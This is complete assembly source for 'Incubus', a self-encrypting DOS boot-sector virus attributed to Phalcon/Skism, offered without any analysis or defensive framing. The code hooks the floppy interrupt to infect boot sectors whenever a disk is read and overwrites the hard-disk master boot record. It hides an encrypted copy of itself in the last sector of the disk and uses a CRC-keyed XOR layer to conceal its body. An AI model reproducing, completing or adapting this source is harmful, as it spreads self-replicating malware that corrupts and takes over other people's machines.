CSEG SEGMENT
     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
     ORG 0H


Incubus_Size    equ     offset Incubus_End-offset Incubus_Start

Vector_40       equ     40h*4h          ;offset in IVT of int 40h

Compare_Code_Size equ   offset Load_Comp-offset Load_Code

Boot_Code_Size  equ     offset Boot_Code_End-offset Boot_Code_Start

Crypt_Size      equ     (offset Crypt_End-offset Crypt_Start)/2

Incubus_Start:  push es
                pop ds                  ;ES = DS = 0
                call Crypt_Code         ;decrypt virus
Crypt_Start:    mov si,offset Boot_Code+7e00h ;original boot sector code                
                mov di,7c00h            ;original boot sector is here
                push es
                push di                 ;ES:DI=0:7c00h, jump there when done
                cld
                movsw                   ;restore first two bytes
                add di,3eh-2h           ;DI = 7c3eh                
                mov cx,Boot_Code_Size   ;size of saved boot code
                rep movsb
                mov ax,ds:[46ch]        ;get random word
                mov word ptr ds:[Garble_Key+7e00h],ax
                dec word ptr ds:[413h]  ;subtract 1k from memory
                int 12h                 ;get memory
                mov cl,0ah              ;rotation mask
                ror ax,cl               ;convert memory k's to segment
                mov es,ax               ;into ES
                mov si,7e00h            ;offset of Incubus_Start at boot-up
                xor di,di               ;copy to offset zero
                mov cx,Incubus_Size
                rep movsb               ;copy Incubus 7 to high memory
                mov si,Vector_40
                
;The carry flag was cleared when XOR DI,DI was executed.                

                mov ax,offset New_40    ;store offset first
Hook_Loop:      xchg ax,ds:[si]         ;exchange our pointer with original
                                        ;pointer
                stosw                   ;save in our high copy
                inc si                  ;increment pointer
                inc si
                mov ax,es               ;next do the segments
                cmc                     ;Loop once
                jb Hook_Loop
                push es                 ;jump to high segment
                mov ax,offset High_Start ;where to jump in high memory
                push ax
                retf                    ;jump

High_Start:     push cs
                pop ds                  ;DS = ES = CS = High virus segment
                mov ax,201h             ;Read one sector
                mov bx,offset Sector    ;read it to Sector
                mov cx,1h               ;track 0 sector 1
                mov dx,0080h            ;head 0, drive c:
                int 13h
                jb Hard_Infect_No
                mov cx,ds:[Sector.pt_End_Sector_Track] ;get last track/sector
                and cx,0000000000111111b     ;Last sector, track 0
                call Compare            ;check for infections, if no, infect
                jb Hard_infect_No       ;if carry, then already infected
                xor bx,bx               ;offset Incubus_Start
                mov ax,301h             ;write one sector
                push ax                 ;Push 301h, it saves a byte.
                call Crypt_13           ;encrypt virus, and call Int 13
                pop ax                  ;AX = 301h
                jb Hard_Infect_No
                mov bx,offset Sector    ;write sector
                xor cx,cx
                inc cx                  ;track 0, sector 1  MBR
                int 13h                 ;write it back to disk
Hard_Infect_No: retf                    ;JMP 0000:7c00h

Boot_Code       dw ?                    ;first two bytes
Boot_Code_Start:cli
                xor ax,ax
                mov ss,ax
                mov sp,7c00h
                push ss
                pop es
                mov ax,201h
                mov bx,7e00h
                mov cx,0000h
                mov dx,0000h
                int 13h
                jmp bx
Boot_Code_End:

Load_Code:      cli
                xor ax,ax
                mov ss,ax
                mov sp,7c00h
                push ss
                pop es
                mov ax,201h
                mov bx,7e00h
                db 0b9h                 ;mov cx,
Load_Comp:                              ;stop comparing here
Load_CX         dw ?
                db 0bah                 ;mov dx,
Load_DX         dw ?
                int 13h
                jmp bx


Incubus_Name:   db 'Incubus '
Incubus_Author: db 'PRiEST - Phalcon/Skism' 
                           
Crypt_End:


Crypt_Code:     pushf
                push ax
                push bx
                push cx                 ;save registers
                call $+3                ;push IP
                pop si
                sub si,offset $-1       ;DI = offset Incubus_Start
                lea di,ds:[si+Crypt_Start]
                mov cx,Crypt_Size       ;size of code to crypt
                call Get_CRC            ;encrypt virus by virus's CRC
Crypt_Loop:     xor word ptr ds:[di],ax ;crypt virus code
                inc di
                inc di                  ;increment pointer
                rol ax,cl               ;rotate key
                loop Crypt_Loop
                pop cx
                pop bx
                pop ax
                popf
                retn

Garble_Key      dw ?                    ;A random word here will cause the
                                        ;encryption key to change

Get_CRC:        push cx
                push di
                push si
                add si,offset Crypt_Code
                mov cx,(offset Incubus_End-offset Crypt_Code)/2
                xor bx,bx               ;initiate CRC to zero
Get_CRC_Loop:   cld
                lodsw                   ;get word from virus
                xor bx,ax               ;encrypt checksum by word
                rol bx,cl               ;encrypt checksum
                loop Get_CRC_Loop
                xchg ax,bx              ;CRC into AX
                pop si
                pop di
                pop cx
                retn


New_40:         cmp ax,201h             ;Read a sector?
                jne Jump_40
                cmp cx,1h               ;first sector, first track?
                jne Jump_40
                cmp dh,00h              ;First head?
                je Infect
Jump_40:        jmp cs:Old_40

Call_40:        pushf                   ;simulate an interrupt
                call cs:Old_40
                retn

Infect:         call Call_40
                pushf
                push ax
                push bx
                push cx
                push dx
                push di
                push si
                push ds
                push es                 ;push all registers
                jb Infect_Error
                push es
                pop ds                  ;DS = segment of boot sector
                push cs
                pop es                  ;copy boot sector to our segment
                mov si,bx               ;boot sector was at ES:BX
                mov di,offset Sector    ;copy to Sector
                mov cx,100h             ;move 256 words
                cld
                rep movsw               ;copy boot sector to Sector
                push cs
                pop ds                  ;DS = CS
                call Calculate          ;Find last sector on drive
                jb Infect_Error
                call Compare            ;infected?
                jb Infect_Error
                mov ax,301h             ;write to disk
                xor bx,bx               ;at offset Incubus_Start
                push ax                 ;save write function
                call Crypt_Code         ;encrypt virus
                call Call_40
                call Crypt_Code         ;decrypt virus
                pop ax
                jb Infect_Error
                mov bx,offset Sector
                xor cx,cx
                inc cx                  ;track zero, sector 1
                mov dh,ch               ;head zero, same drive
                call Call_40
Infect_Error:   pop es
                pop ds
                pop si
                pop di
                pop dx
                pop cx
                pop bx
                pop ax
                popf                    ;Pop all returns from int 40, and
                retf 0002h              ;return to caller


Calculate:      mov di,dx               ;save drive in DI
                mov ax,ds:[Sector.bs_Sectors] ;Get total amount of sectors
                or ax,ax                ;can not do if zero
                je Calculate_Error
                mov cx,ds:[Sector.bs_Sectors_Per_Track] ;Get sectors per track
                jcxz Calculate_Error    ;can not do if zero
                cwd                     ;zero out DX
                div cx                  ;AX = number of tracks
                or dx,dx                ;must have been an even divide
                jne Calculate_Error      
                mov bx,ds:[Sector.bs_Heads] ;get number of heads
                or bx,bx
                je Calculate_Error
                div bx                  ;divide by number of heads
                or dx,dx                ;must have been an even divide
                jne Calculate_Error      
                mov dx,di               ;drive back into DL
                mov dh,bl               ;Head number into DH
                dec dh                  ;zero based now
                mov ch,al               ;Track number into CH
                dec ch                  ;zero based also
                clc
                retn
Calculate_Error:stc                     ;return error
                retn

;This will check the boot sector for infection, if not infected, it will
;add the Load_Code to the boot sector, while saving the original contents
;into Boot_Code.

Compare:        push cx                 ;save register
                push dx
                and dl,80h              ;either C: or A:
                mov word ptr ds:[Load_CX],cx ;put sector/track into loader
                mov word ptr ds:[Load_DX],dx ;head 0, drive c:
                pop dx
                mov di,offset Sector+3eh ;offset of where our code would be
                mov si,offset Load_Code ;offset of code to compare
                mov cx,Compare_Code_Size
                cld
                repe cmpsb              ;compare code
                je Already_Inf
                cmp word ptr ds:[Sector_ID],0aa55h  ;Is it a valid sector?
                jne Already_Inf
                mov si,offset Sector    ;offset of boot sector
                mov di,offset Boot_Code ;save it here
                mov ax,3cebh            ;jmp $+3ch
                xchg ax,ds:[si]         ;exchange with Boot sector's first
                                        ;two bytes
                stosw                   ;save at Boot_Code
                add si,3eh              ;SI = offset Sector+3eh
                mov cx,Boot_Code_Size   ;size of loader code
                
                push cx                 ;save size count
                push si                 ;save pointer to boot sector
                rep movsb               ;save code into our code
                mov si,di               ;move offset of Load_Boot into si
                pop di                  ;restore pointer to boot sector
                pop cx                  ;restore size count
                rep movsb               ;mov our loader into boot sector
                pop cx                  ;restore saved register
                clc                     ;return no error
                retn

Already_Inf:    pop cx                  ;restore saved register
                stc                     ;return error
                retn

Crypt_13:       call Crypt_Code         ;encrypt virus
                int 13h
                call Crypt_Code         ;decrypt virus
                retn

Incubus_End:   
        
Old_40          dd ?            ;original Int 40h   


Sector          db 510 dup (?)
Sector_ID       dw ?                    ;Should equal 0aa55h for valid boot
                                        ;sector

                



Boot_Sector             STRUC
bs_Jump                 db 3 dup(?)
bs_Oem_Name             db 8 dup(?)
bs_Bytes_Per_Sector     dw ?
bs_Sectors_Per_Cluster  db ?
bs_Reserved_Sectors     dw ?
bs_FATs                 db ?             ;Number of FATs
bs_Root_Dir_Entries     dw ?             ;Max number of root dir entries
bs_Sectors              dw ?             ;number of sectors; small
bs_Media                db ?             ;Media descriptor byte
bs_Sectors_Per_FAT      dw ?
bs_Sectors_Per_Track    dw ?
bs_Heads                dw ?             ;number of heads
bs_Hidden_Sectors       dd ?
bs_Huge_Sectors         dd ?             ;number of sectors; large
bs_Drive_Number         db ?
bs_Reserved             db ?
bs_Boot_Signature       db ?
bs_Volume_ID            dd ?
bs_Volume_Label         db 11 dup(?)
bs_File_System_Type     db 8 dup(?)
Boot_Sector             ENDS


Partition_Table         STRUC
pt_Code                 db 1beh dup(?)  ;partition table code
pt_Status               db ?            ;0=non-bootable 80h=bootable
pt_Start_Head           db ?            
pt_Start_Sector_Track   dw ?
pt_Type                 db ?            ;1 = DOS 12bit FAT 4 = DOS 16bit FAT
pt_End_Head             db ?
pt_End_Sector_Track     dw ?
pt_Starting_Abs_Sector  dd ?
pt_Number_Sectors       dd ?
Partition_Table         ENDS

CSEG ENDS
     END Incubus_Start
     